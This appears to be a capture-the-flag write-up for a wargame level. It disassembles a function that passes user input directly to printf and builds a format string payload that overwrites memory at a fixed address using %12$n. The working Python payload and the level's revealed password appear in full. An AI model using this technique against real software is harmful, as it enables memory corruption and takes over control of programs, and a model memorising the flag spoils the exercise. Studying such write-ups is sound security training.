Same as the last exercice, we need to use `String Format Exploit`, we decompile with `objdump -d level4` :
```nasm
08048444 <p>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
 804844d:	89 04 24             	mov    %eax,(%esp)
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave  
 8048456:	c3                   	ret 
```

```bash
python -c 'print "AAAA " + "%x "*15' | ./level4 
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 
```
we found 41414141 at the 12th position

So we may use `printf()` in `p()` function to evaluate and change the `EIP` register :
At 12th posisition got `41414141` so we replace `AAAA` by the address to change, followed by a huge padding equal to 16930116 (-4 to decrease `m()` address length) and finaly followed by `%12$n`
`m()` is at *0x08049810

```bash
python -c 'print  "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```